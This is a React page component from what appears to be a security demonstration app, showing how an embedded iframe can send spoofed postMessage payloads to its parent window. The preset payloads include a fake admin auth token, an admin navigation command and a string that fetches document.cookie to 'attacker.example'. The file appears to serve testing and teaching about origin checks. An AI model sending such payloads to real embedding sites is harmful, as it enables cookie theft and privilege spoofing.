"use client";

import { Log, useLog } from "@/app/Log";

import { EmbedSnippet } from "@/app/EmbedSnippet";
import { ScenarioHeader } from "@/app/ScenarioHeader";
import { findScenario } from "@/lib/scenarios";
import { useScenarioBody } from "../useScenarioBody";
import { useState } from "react";

const PRESET_PAYLOADS: { key: string; data: unknown }[] = [
  { key: "presetString", data: "hello-from-attacker" },
  {
    key: "presetAuth",
    data: { type: "AUTH", token: "FAKE-JWT.eyJ...", role: "admin" },
  },
  { key: "presetRouter", data: { type: "NAVIGATE", path: "/admin/settings" } },
  { key: "presetResize", data: { type: "iframe-resizer", height: 99999 } },
  {
    key: "presetScript",
    data: "fetch('https://attacker.example/exfil?c='+document.cookie)",
  },
];

const PostMessagePage = () => {
  const scenario = findScenario("post-message")!;
  const { lines, push, clear } = useLog();
  const [target, setTarget] = useState("*");
  const { actions, log, text, explanation, scenarioPage } =
    useScenarioBody("post-message");

  const send = (data: unknown) => {
    push(log("sending", { data: JSON.stringify(data), target }));
    try {
      window.parent.postMessage(data, target as string);
      push(log("sent"));
    } catch (e) {
      push(log("sendFailed", { message: (e as Error).message }));
    }
  };

  return (
    <>
      <ScenarioHeader scenario={scenario} />
      <EmbedSnippet slug="post-message" />

      <h2>{scenarioPage.actions}</h2>
      <div className="kv">
        <div className="k">{text("targetOriginLabel")}</div>
        <div>
          <input
            value={target}
            onChange={e => setTarget(e.target.value)}
            placeholder={text("targetPlaceholder")}
          />
        </div>
      </div>
      <div className="actions">
        {PRESET_PAYLOADS.map(p => (
          <button key={p.key} className="danger" onClick={() => send(p.data)}>
            {actions(p.key)}
          </button>
        ))}
        <button onClick={clear}>{actions("clearLog")}</button>
      </div>
      <Log lines={lines} />

      <h2>{scenarioPage.explanation}</h2>
      <ul>
        {explanation.map((html, i) => (
          <li key={i} dangerouslySetInnerHTML={{ __html: html }} />
        ))}
      </ul>
    </>
  );
};

export default PostMessagePage;
